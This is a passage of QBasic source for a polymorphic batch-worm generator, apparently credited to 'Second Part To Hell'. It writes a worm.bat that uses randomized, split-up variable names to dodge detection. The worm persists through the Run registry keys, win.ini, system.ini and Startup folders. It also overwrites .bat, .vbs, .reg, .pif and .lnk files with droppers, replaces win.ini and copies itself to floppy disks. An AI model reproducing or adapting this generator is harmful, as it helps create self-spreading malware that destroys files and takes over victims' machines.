IF rand = 4 THEN regA$ = "Sof%regA%"
rand = INT(RND * 4) + 1
IF rand = 1 THEN PRINT #1, ""; DD$; "set regB=w"
IF rand = 1 THEN regb$ = "%regB%are"
IF rand = 2 THEN PRINT #1, ""; DD$; "set regB=a"
IF rand = 2 THEN regb$ = "w%regB%re"
IF rand = 3 THEN PRINT #1, ""; DD$; "set regB=r"
IF rand = 3 THEN regb$ = "wa%regB%e"
IF rand = 4 THEN PRINT #1, ""; DD$; "set regB=e"
IF rand = 4 THEN regb$ = "war%regB%"
PRINT #1, "goto redrri "; DD$
rand = INT(RND * 4) + 1
ran = INT(RND * 26) + 97
regAP$ = CHR$(ran)
ran = INT(RND * 26) + 97
regBP$ = CHR$(ran)
regAPP$ = regAP$ + regBP$
ran = INT(RND * 26) + 97
regAP$ = CHR$(ran)
ran = INT(RND * 26) + 97
regBP$ = CHR$(ran)
regBPP$ = regAP$ + regBP$
PRINT #1, ""; DD$; "set regA="; regAPP$
PRINT #1, ""; DD$; "set regB="; regBPP$
PRINT #1, ":regdrri "; DD$
regAB$ = regA$ + regb$
PRINT #1, "echo [HKEY_LOCAL_MACHINE\"; regAB$; "\Microsoft\Windows\CurrentVersion\Run] >>"; psyreg$; DD$
PRINT #1, "echo "; CHR$(34); regpathname$; CHR$(34); "="; CHR$(34); "%windir%\"; regwormfile$; CHR$(34); ">>"; psyreg$; DD$
PRINT #1, ""; DD$; "set RDA=for"
PRINT #1, "%RDA% %%r in (*.reg \*.reg ..\*.reg %path%\*.reg %windir%\*.reg) do copy "; psyreg$; " %%r"; DD$
PRINT #1, "del "; psyreg$; DD$
PRINT #1, ""; DD$; "set regA="
PRINT #1, ""; DD$; "set regB="
RegFileEnd:
IF VBSFileI = 1 THEN GOTO VBSInfection
GOTO VBSInfectionEnd
VBSInfection:
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
vbsDropFile$ = a$ + B$ + c$ + d$ + e$ + ".vbs"
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
vbsDropFileRun$ = "%windir%\" + a$ + B$ + c$ + d$ + e$ + ".bat"
rand = INT(RND * 4) + 1
IF rand = 1 THEN PRINT #1, ""; EE$; "set vbsA=w"
IF rand = 1 THEN vbsAP$ = "%vbsA%scr"
IF rand = 2 THEN PRINT #1, ""; EE$; "set vbsA=s"
IF rand = 2 THEN vbsAP$ = "w%vbsA%cr"
IF rand = 3 THEN PRINT #1, ""; EE$; "set vbsA=c"
IF rand = 3 THEN vbsAP$ = "ws%vbsA%r"
IF rand = 4 THEN PRINT #1, ""; EE$; "set vbsA=r"
IF rand = 4 THEN vbsAP$ = "wsc%vbsA%"
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; EE$; "set vbsB=i"
IF rand = 1 THEN vbsBP$ = "%vbsB%pt"
IF rand = 2 THEN PRINT #1, ""; EE$; "set vbsB=p"
IF rand = 2 THEN vbsBP$ = "i%vbsB%t"
IF rand = 3 THEN PRINT #1, ""; EE$; "set vbsB=t"
IF rand = 3 THEN vbsBP$ = "ip%vbsB%"
vbsAB$ = vbsAP$ + vbsBP$
PRINT #1, "goto VBSdropwri "; EE$
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
vbsAPF$ = a$ + B$
PRINT #1, "set vbsA="; vbsAPF$; EE$
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
vbsBPF$ = a$ + B$
PRINT #1, ""; EE$; "set vbsB="; vbsBPF$
PRINT #1, ":vbsdropwri "; EE$
PRINT #1, "copy "; MyS$; " "; vbsDropFile$; EE$
PRINT #1, "copy "; MyS$; " "; vbsDropFileRun$; EE$
PRINT #1, "echo.on error resume next > "; vbsDropFile$; EE$
PRINT #1, "echo dim wsh >>"; vbsDropFile$; EE$
PRINT #1, "echo set wsh="; vbsAB$; ".createobject("; CHR$(34); vbsAB$; ".shell"; CHR$(34); ") >>"; vbsDropFile$; EE$
PRINT #1, "echo wsh.run "; CHR$(34); vbsDropFileRun$; CHR$(34); " >>"; vbsDropFile$; EE$
PRINT #1, ""; EE$; "set VDA=for"
PRINT #1, "%VDA% %%q in (*.vbs \*.vbs ..\*.vbs %path%\*.vbs %windir%\*.vbs) do copy "; vbsDropFile$; " %%q"; EE$
PRINT #1, ""; EE$; "set VDA="
PRINT #1, ""; EE$; "set vbsA="
PRINT #1, ""; EE$; "set vbsB="
VBSInfectionEnd:
IF regkey = 1 THEN GOTO ReKey
GOTO ReKeyEnd
ReKey:
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
regi$ = a$ + B$ + c$ + d$ + e$ + ".vbs"
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
regiop$ = a$ + B$ + c$ + d$ + e$ + ".bat"
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
reginame$ = a$ + B$ + c$ + d$ + e$
PRINT #1, "copy "; MyS$; " "; regi$; CC$
PRINT #1, "copy "; MyS$; " %windir%\"; regiop$; CC$
PRINT #1, "echo.on error resume next >"; regi$; CC$
PRINT #1, "echo set ws = CreateObject("; CHR$(34); "wscript.shell"; CHR$(34); ") >> "; regi$; CC$
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
c$ = a$ + B$
PRINT #1, ""
PRINT #1, ""; CC$; "set regi=HKLM"
PRINT #1, "goto regiri"; CC$
PRINT #1, ""; CC$; "set regi="; c$
PRINT #1, ":regiri"; CC$
PRINT #1, "echo ws.regwrite "; CHR$(34); "%regi%\Software\Microsoft\Windows\CurrentVersion\Run\"; reginame$; CHR$(34); ","; CHR$(34); "%windir%\"; regiop$; CHR$(34); " >>"; regi$; CC$
PRINT #1, ""; CC$; "set regi="
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; CC$; "set regiA=sc"
IF rand = 1 THEN regy$ = "c%regi%ript"
IF rand = 2 THEN PRINT #1, ""; CC$; "set regiA=rip"
IF rand = 2 THEN regy$ = "csc%regiA%t"
IF rand = 3 THEN PRINT #1, ""; CC$; "set regiA=csc"
IF rand = 3 THEN regy$ = "%regiA%ript"
PRINT #1, ""; regy$; " "; regi$; CC$
PRINT #1, "del "; regi$; CC$
PRINT #1, "set regiA="; CC$
ReKeyEnd:
IF BatDateienInf = 1 THEN GOTO BatDatei
GOTO BatDateiEnd
BatDatei:
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
bafina$ = a$ + B$ + c$ + d$ + e$ + ".bat"
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
fakeBDAs$ = a$ + B$ + c$
PRINT #1, ""; DD$; "set BDAs="; fakeBDAs$
PRINT #1, ""; DD$; "set BDAs=for"
PRINT #1, ""; DD$; "goto BDAsas"
PRINT #1, ""; DD$; "set BDAs=mfe"
PRINT #1, ""; DD; ":BDAsas"
PRINT #1, "copy "; MyS$; " %winDir%\"; bafina$; DD$
PRINT #1, "%BDAs% %%v in (*.bat ..\*.bat \*.bat %path%\*.bat) do copy %WinDir%\"; bafina$; " %%v "; DD$
PRINT #1, "del %WinDir%\"; bafina$; DD$
BatDateiEnd:
IF DeuAutoSt = 1 THEN GOTO Deuaustart
GOTO deuautostend
Deuaustart:
deuautoSta = INT(RND * 3) + 1
RANDOMIZE TIMER
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
daufina$ = a$ + B$ + c$ + d$ + e$ + ".bat"
IF deuautoSta = 1 THEN PRINT #1, "copy "; MyS$; " %windir%\startm~1\progra~1\autost~1\*.bat"; DD$
IF deuautoSta = 2 THEN PRINT #1, "copy "; MyS$; " C:\"; daufina$; DD$
IF deuautoSta = 2 THEN PRINT #1, "copy C:\"; daufina$; " %windir%\startm~1\progra~1\autost~1\*.bat"; DD$
IF deuautoSta = 2 THEN PRINT #1, "del C:\"; daufina$; DD$
IF deuautoSta = 3 THEN PRINT #1, "copy "; MyS$; " C:\"; daufina$; DD$
IF deuautoSta = 3 THEN PRINT #1, "move  C:\"; daufina$; " %windir%\startm~1\progra~1\autost~1"; DD$
deuautostend:
IF EngAutoSt = 1 THEN GOTO EngAuSt
GOTO EngAuStEnd
EngAuSt:
RANDOMIZE TIMER
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
eaufina$ = a$ + B$ + c$ + d$ + e$ + ".bat"
PRINT #1, "copy "; MyS$; " %windir%\Startm~1\Programs\StartUp\"; eaufina$; EE$
EngAuStEnd:
IF LogLauf = 1 GOTO LogLaufwerk
GOTO AD
LogLaufwerk:
llf = INT(RND * 2) + 1
RANDOMIZE TIMER
subfina$ = "ikqus.bat"
IF llf = 1 THEN PRINT #1, "md C:\suPs"; CC$
IF llf = 1 THEN PRINT #1, "copy "; MyS$; " C:\suPs\"; subfina$; CC$
IF llf = 1 THEN PRINT #1, "subst L: C:\suPs"; CC$
IF llf = 2 THEN PRINT #1, "md C:\suPs"; CC$
IF llf = 2 THEN PRINT #1, "copy "; MyS$; " C:\suPs\"; subfina$; CC$
IF llf = 2 THEN PRINT #1, "subst L: C:\suPs"; CC$
AD:
IF windir = 1 THEN GOTO WinD
GOTO EndWinD
WinD:
RANDOMIZE TIMER
wdfina$ = "jduif.bat"
WinDR = INT(RND * 2) + 1
IF WinDR = 1 THEN PRINT #1, ""; CC$; "set WDs=for"
IF WinDR = 1 THEN PRINT #1, "copy "; MyS$; " C:\"; wdfina$; CC$
IF WinDR = 1 THEN PRINT #1, "%WDs% %%w in (%windir%\*.bat) do copy C:\"; wdfina$; " %%w"; CC$
IF WinDR = 1 THEN PRINT #1, "del C:\"; wdfina$; CC$
IF WinDR = 2 THEN PRINT #1, ""; CC$; "set WDs=for"
IF WinDR = 2 THEN PRINT #1, "ren %WinDir%\*.bat *.ifk"; CC$
IF WinDR = 2 THEN PRINT #1, "copy "; MyS$; " C:\"; wdfina$; CC$
IF WinDR = 2 THEN PRINT #1, "%WDs% %%w in (%windir%\*.ifk) do copy C:\"; wdfina$; " %%w"; CC$
IF WinDR = 2 THEN PRINT #1, "ren %windir%\*.ifk *.bat"; CC$
IF WinDR = 2 THEN PRINT #1, "del C:\"; wdfina$; CC$
EndWinD:
IF WinINI = 1 GOTO WiINI
GOTO WiINIEnd
WiINI:
PRINT #1, "copy "; MyS$; " %WinDir%\system\WINI.bat"; DD$
inip = INT(RND * 2) + 1
IF inip = 1 THEN PRINT #1, "echo [windows] >funny.bat"; DD$
IF inip = 2 THEN PRINT #1, ""; DD$; "set inia=windows"
IF inip = 2 THEN PRINT #1, "echo [%inia%] >funny.bat"; DD$
inip = INT(RND * 2) + 1
IF inip = 1 THEN PRINT #1, "echo load=%windir%\system\WINI.bat >>funny.bat"; DD$
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
c$ = a$ + B$
IF inip = 1 THEN PRINT #1, ""; DD$; "set inib="; c$
IF inip = 2 THEN PRINT #1, ""; DD$; "set inib=system"
IF inip = 2 THEN PRINT #1, "echo load=%windir%\%inib%\WINI.bat >>funny.bat"; DD$
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
c$ = a$ + B$
PRINT #1, "set inic="; c$; DD$
PRINT #1, ""; DD$; "set inic=WINI.bat"
PRINT #1, "echo run=%windir%\system\%inic% >>funny.bat"; DD$
PRINT #1, ""; DD$; "set inid="
PRINT #1, ""; DD$; "set inic=Port"
PRINT #1, ""; DD$; "set inib=Null"
PRINT #1, ""; DD$; "set inia=%inib%%inic%"
PRINT #1, ""; DD$; "set wiech=ec"
PRINT #1, ""; DD$; "set wiechb=%wiech%ho"
PRINT #1, "%wiechb% %inia%=None >>funny.bat"; DD$
PRINT #1, "copy funny.bat %windir%\dd.ini"; DD$
inip = INT(RND * 2) + 1
IF inip = 1 THEN PRINT #1, "del %windir%\win.ini"; DD$
IF inip = 2 THEN PRINT #1, ""; DD$; "set inif=win"
IF inip = 2 THEN PRINT #1, "del %windir%\%inif%.ini"; DD$
inip = INT(RND * 2) + 1
IF inip = 1 THEN PRINT #1, "del funny.bat"; DD$
IF inip = 2 THEN PRINT #1, ""; DD$; "set inig=unny"
IF inip = 2 THEN PRINT #1, "del f%inig%.bat"; DD$
inip = INT(RND * 2) + 1
IF inip = 1 THEN PRINT #1, "ren %windir%\dd.ini win.ini"; DD$
IF inip = 2 THEN PRINT #1, ""; DD$; "set inih=dd.in"
IF inip = 2 THEN PRINT #1, "ren %windir%\%inih%i win.ini"; DD$
PRINT #1, ""; DD$; "set inih="
PRINT #1, ""; DD$; "set inig="
PRINT #1, ""; DD$; "set inif="
PRINT #1, ""; DD$; "set inie="
WiINIEnd:
IF PifFileI = 1 THEN GOTO PifFInfection
GOTO PIFFInfectionEnd
PifFInfection:
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
PIFDropFile$ = a$ + B$ + c$ + d$ + e$ + ".bat"
PRINT #1, "copy "; MyS$; " %windir%\drop.vbs"; EE$
PRINT #1, "copy "; MyS$; " %windir%\"; PIFDropFile$; EE$
PRINT #1, "echo dim wshs, msc > %windir%\drop.vbs"; EE$
rand = INT(RND * 2) + 1
IF rand = 1 THEN PRINT #1, ""; EE$; "set pifA=WS"
IF rand = 1 THEN PRINT #1, "echo set wshs=Wscript.CreateObject("; CHR$(34); "%pifA%cript.Shell"; CHR$(34); ") >> %windir%\drop.vbs"; EE$
IF rand = 1 THEN PRINT #1, ""; EE$; "set pifA="
IF rand = 2 THEN PRINT #1, ""; EE$; "set pifA=cript"
IF rand = 2 THEN PRINT #1, "echo set wshs=Wscript.CreateObject("; CHR$(34); "WS%pifA%.Shell"; CHR$(34); ") >> %windir%\drop.vbs"; EE$
IF rand = 2 THEN PRINT #1, ""; EE$; "set pifA="
rand = INT(RND * 4) + 1
IF rand = 1 THEN PRINT #1, ""; EE$; "set pifB=Cr"
IF rand = 1 THEN PRINT #1, "echo set msc=wshs.%pifB%eateShortcut("; CHR$(34); "C:\pif.lnk"; CHR$(34); ") >> %windir%\drop.vbs"; EE$
IF rand = 2 THEN PRINT #1, ""; EE$; "set pifB=ea"
IF rand = 2 THEN PRINT #1, "echo set msc=wshs.Cr%pifB%teShortcut("; CHR$(34); "C:\pif.lnk"; CHR$(34); ") >> %windir%\drop.vbs"; EE$
IF rand = 3 THEN PRINT #1, ""; EE$; "set pifB=te"
IF rand = 3 THEN PRINT #1, "echo set msc=wshs.Crea%pifB%Shortcut("; CHR$(34); "C:\pif.lnk"; CHR$(34); ") >> %windir%\drop.vbs"; EE$
IF rand = 4 THEN PRINT #1, ""; EE$; "set pifB=CreateShortcut"
IF rand = 4 THEN PRINT #1, "echo set msc=wshs.%pifB%("; CHR$(34); "C:\pif.lnk"; CHR$(34); ") >> %windir%\drop.vbs"; EE$
PRINT #1, ""; EE$; "set pifB="
PRINT #1, "echo msc.TargetPath = wshs.ExpandEnvironmentStrings("; CHR$(34); "%windir%\"; PIFDropFile$; CHR$(34); ") >> %windir%\drop.vbs"; EE$
PRINT #1, "echo msc.WindowStyle = 4 >> %windir%\drop.vbs"; EE$
rand = INT(RND * 2) + 1
IF rand = 1 THEN PRINT #1, ""; EE$; "set pifC=Sa"
IF rand = 1 THEN PRINT #1, "goto pifdri"; EE$
IF rand = 1 THEN PRINT #1, ""; EE$; "set pifC=kfie"
IF rand = 1 THEN PRINT #1, ":pifdri"; EE$
IF rand = 1 THEN PRINT #1, "echo msc.%pifC%ve >> %windir%\drop.vbs"; EE$
IF rand = 2 THEN PRINT #1, ""; EE$; "set pifC=ve"
IF rand = 2 THEN PRINT #1, "goto pifdri"; EE$
IF rand = 2 THEN PRINT #1, ""; EE$; "set pifC=ueqha"
IF rand = 2 THEN PRINT #1, ":pifdri"; EE$
IF rand = 2 THEN PRINT #1, "echo msc.Sa%pifC% >> %windir%\drop.vbs"; EE$
PRINT #1, ""; EE$; "set pifC="
rand = INT(RND * 2) + 1
IF rand = 1 THEN PRINT #1, ""; EE$; "set pifD=cscript"
IF rand = 1 THEN PRINT #1, "%pifD% %windir%\drop.vbs"; EE$
IF rand = 2 THEN PRINT #1, ""; EE$; "set pifD=scr"
IF rand = 2 THEN PRINT #1, "c%pifD%ipt %windir%\drop.vbs"; EE$
PRINT #1, "del %windir%\drop.vbs"; EE$
PRINT #1, ""; EE$; "set PDA=for"
PRINT #1, "%PDA% %%k in (*.pif \*.pif ..\*.pif %path%\*.pif %windir%\*.pif) do copy C:\pif.pif %%k"; EE$
PRINT #1, ""; EE$; "set PDA="
PRINT #1, "del C:\pif.pif"; EE$
PIFFInfectionEnd:
IF LnkFileI = 1 THEN GOTO LnkFileInfection
GOTO LnkFileInfectionEnd
LnkFileInfection:
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
LNKdropFile$ = a$ + B$ + c$ + d$ + e$ + ".bat"
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
lnkAPF$ = a$ + B$
PRINT #1, ""; CC$; "set lnkA="; lnkAPF$;
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
lnkBPF$ = a$ + B$
PRINT #1, "set lnkB="; lnkBPF$; CC$
rand = INT(RND * 4) + 1
IF rand = 1 THEN PRINT #1, ""; CC$; "set lnkA=w"
IF rand = 1 THEN lnkAP$ = "%lnkA%scr"
IF rand = 2 THEN PRINT #1, ""; CC$; "set lnkA=s"
IF rand = 2 THEN lnkAP$ = "w%lnkA%cr"
IF rand = 3 THEN PRINT #1, ""; CC$; "set lnkA=c"
IF rand = 3 THEN lnkAP$ = "ws%lnkA%r"
IF rand = 4 THEN PRINT #1, ""; CC$; "set lnkA=r"
IF rand = 4 THEN lnkAP$ = "wsc%lnkA%"
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; CC$; "set lnkB=i"
IF rand = 1 THEN lnkBP$ = "%lnkB%pt"
IF rand = 2 THEN PRINT #1, ""; CC$; "set lnkB=p"
IF rand = 2 THEN lnkBP$ = "i%lnkB%t"
IF rand = 3 THEN PRINT #1, ""; CC$; "set lnkB=t"
IF rand = 3 THEN lnkBP$ = "ip%lnkB%"
lnkAB$ = lnkAP$ + lnkBP$
PRINT #1, ""; CC$; "set lnka=run"
PRINT #1, "goto lnkdrri "; CC$
PRINT #1, ""; CC$; "set lnka=kla"
PRINT #1, ":lnkdrri "; CC$
PRINT #1, "copy "; MyS$; " %windir%\dropa.vbs"; CC$
PRINT #1, "copy "; MyS$; " %windir%\"; LNKdropFile$; CC$
PRINT #1, "copy "; MyS$; " %windir%\dropb.vbs"; CC$
PRINT #1, "echo.on error resume next >%windir%\dropb.vbs"; CC$
PRINT #1, "echo dim wsh >>%windir%\dropb.vbs"; CC$
PRINT #1, "echo set wsh="; lnkAB$; ".createobject("; CHR$(34); lnkAB$; ".shell"; CHR$(34); ") >>%windir%\dropb.vbs"; CC$
PRINT #1, "echo wshs.%lnka% "; CHR$(34); "%windir%\"; LNKdropFile$; CHR$(34); " >>%windir%\dropb.vbs"; CC$
PRINT #1, "echo dim wsh, msc > %windir%\dropa.vbs"; CC$
PRINT #1, "echo set wsh="; lnkAB$; ".CreateObject("; CHR$(34); lnkAB$; ".Shell"; CHR$(34); ") >> %windir%\dropa.vbs"; CC$
PRINT #1, "echo set msc=wsh.CreateShortcut("; CHR$(34); "C:\vbs.lnk"; CHR$(34); ") >> %windir%\dropa.vbs"; CC$
PRINT #1, "echo msc.TargetPath = wshs.ExpandEnvironmentStrings("; CHR$(34); "%windir%\dropb.vbs "; CHR$(34); ") >> %windir%\dropa.vbs"; CC$
PRINT #1, "echo msc.WindowStyle = 4 >> %windir%\dropa.vbs"; CC$
PRINT #1, ""; CC$; "set lnkdA=Save"
PRINT #1, "goto lnkdri"; CC$
PRINT #1, ""; CC$; "set lnkdA=Ejfn"
PRINT #1, ":lnkdri"; CC$
PRINT #1, "echo msc.%lnkdA% >> %windir%\dropa.vbs"; CC$
PRINT #1, "cscript %windir%\dropa.vbs"; CC$
PRINT #1, "del %windir%\dropa.vbs"; CC$
PRINT #1, ""; CC$; "set LDA=for"
PRINT #1, "%LDA% %%k in (*.lnk \*.lnk ..\*.lnk %path%\*.lnk %windir%\*.lnk) do copy C:\vbs.lnk %%k"; CC$
PRINT #1, ""; CC$; "set LDA="
PRINT #1, "del C:\vbs.lnk"; CC$
PRINT #1, ""; CC$; "set lnkA="
PRINT #1, ""; CC$; "set lnkB="
LnkFileInfectionEnd:
IF SysINI = 1 THEN GOTO SystemINI
GOTO SystemINIEnd
SystemINI:
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
sysname$ = a$ + B$ + c$ + d$ + e$ + ".bat"
PRINT #1, "copy "; MyS$; " "; sysname$; DD$
PRINT #1, "echo [boot] > %windir%\system.ini"; DD$
PRINT #1, ""; DD$; "set sysinic=ell"
PRINT #1, ""; DD$; "set sysinib=sh"
PRINT #1, ""; DD$; "set sysinia=%sysinib%%sysinic%"
PRINT #1, "goto sysiniri"; DD$
PRINT #1, ""; DD$; "set sysinia=%sysinic%%sysinib%"
PRINT #1, ":sysiniri "; DD$
PRINT #1, "echo %sysinia%=explorer.exe %windir%\"; sysname$; ">> %windir%\system.ini"; DD$
PRINT #1, ""; DD$; "set sysinia="
PRINT #1, ""; DD$; "set sysinib="
PRINT #1, ""; DD$; "set sysinic="
SystemINIEnd:
IF UDF = 1 THEN GOTO UDFB
GOTO UDFBEnd
UDFB:
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
UDFname$ = a$ + B$ + c$ + d$ + e$ + ".bat"
UDFnameb$ = "jgiqo.bat"
UDFvbs$ = "oejvc.vbs"
UDFlauf = 0
DO WHILE UDFlauf < 5
rand = INT(RND * 2) + 1
IF rand = 1 THEN UDFvar$ = UDFvar$ + "Å"
IF rand = 2 THEN UDFvar$ = UDFvar$ + "³"
UDFlauf = UDFlauf + 1
LOOP
PRINT #1, "cd %windir%"; DD$
PRINT #1, "md "; UDFvar$; DD$
PRINT #1, "cd "; UDFvar$; DD$
PRINT #1, "copy "; MyS$; " "; UDFname$; DD$
PRINT #1, "copy "; MyS$; " %windir%\"; UDFnameb$; DD$
PRINT #1, "copy "; MyS$; " %windir%\"; UDFname$; DD$
UDFpath$ = "%windir%" + UDFname$
PRINT #1, "echo ctty nul > "; UDFpath$; DD$
PRINT #1, "echo cls >>"; UDFpath$; DD$
PRINT #1, "echo if exist %windir%\"; UDFnameb$; " goto UDFend >> "; UDFpath$; DD$
PRINT #1, "echo %windir% >>"; UDFpath$; DD$
PRINT #1, "echo cd "; UDFvar$; " >>"; UDFpath$; DD$
PRINT #1, "echo "; UDFname$; " >> "; UDFpath$; DD$
PRINT #1, "echo :UDFend >>"; UDFpath$; DD$
PRINT #1, "copy "; MyS$; " "; UDFvbs$; DD$
PRINT #1, "echo.on error resume next > "; UDFvbs$; DD$
PRINT #1, "echo set ws=CreateObject("; CHR$(34); "Wscript.Shell"; CHR$(34); ") >>"; UDFvbs$; DD$
PRINT #1, "echo ws.regedit "; CHR$(34); "HKLM\Software\Microsoft\Windows\CurrentsVersion\RUN\UDF"; CHR$(34); ","; CHR$(34); UDFpath$; CHR$(34); DD$
UDFBEnd:
IF Desktop = 1 THEN GOTO Desktp
GOTO Desktpend
Desktp:
DesktopR = INT(RND * 2) + 1
IF DesktopR = 1 THEN PRINT #1, "copy "; MyS$; " %windir%\Desktop\*.bat"; EE$
IF DesktopR = 2 THEN PRINT #1, "copy "; MyS$; " %windir%\Desktop\*.ifk"; EE$
IF DesktopR = 2 THEN PRINT #1, "ren %windir%\Desktop\*.ifk *.bat"; EE$
Desktpend:
IF Diskette = 1 THEN GOTO DiskAdisK
GOTO DiskAdisKEnd
DiskAdisK:
PRINT #1, "command /f /c copy "; MyS$; " A:\ "; CC$
DiskAdisKEnd:
PRINT #1, "del "; MyS$; BB$
PRINT #1, "ctty CON "; BB$
PRINT #1, "echo on"; BB$
IF mesg = 1 THEN PRINT #1, "echo "; msg$; BB$
CLOSE #1
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 7
PRINT ""
PRINT " The worm has been saved as "; CHR$(34); "worm.bat"; CHR$(34); " in the CURRENT direction! "
PRINT ""
PRINT " Please read the INFORMATION."
PRINT ""
PRINT " Thank you for using "; name$; " !!"
PRINT " A new version of the program can be found here:"
COLOR 4
PRINT " http://www.SPTH.de.vu"
PRINT ""
PRINT ""
PRINT "                                         YOURS"
PRINT "                                  Second Part To Hell"
COLOR 7
PRINT ""
INPUT " Press enter... ", nix$
GOTO headline
Ende:
    

